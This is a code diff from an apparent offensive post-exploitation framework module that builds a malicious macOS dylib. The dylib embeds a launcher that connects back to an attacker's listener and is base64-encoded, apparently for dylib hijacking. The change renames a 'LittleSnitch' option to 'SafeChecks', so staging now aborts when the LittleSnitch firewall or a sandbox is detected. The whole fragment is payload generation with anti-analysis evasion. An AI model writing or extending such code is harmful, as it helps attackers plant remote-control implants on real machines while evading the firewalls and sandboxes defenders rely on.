@@ -52,8 +52,8 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   'x86'
             },
-            'LittleSnitch' : {
-                'Description'   :   'Switch. Check for the LittleSnitch process, exit the staging process if it is running. Defaults to True.',
+            'SafeChecks' : {
+                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
             },
@@ -99,9 +99,9 @@ class Module:
         #   original reference script included in the comments.
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
-        LittleSnitch = self.options['LittleSnitch']['Value']
+        SafeChecks = self.options['SafeChecks']['Value']
         arch = self.options['Arch']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, littlesnitch=LittleSnitch)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, safechecks=SafeChecks)
         launcher = launcher.strip('echo').strip(' | python &').strip("\"")
         dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
         encodedDylib = base64.b64encode(dylibBytes)
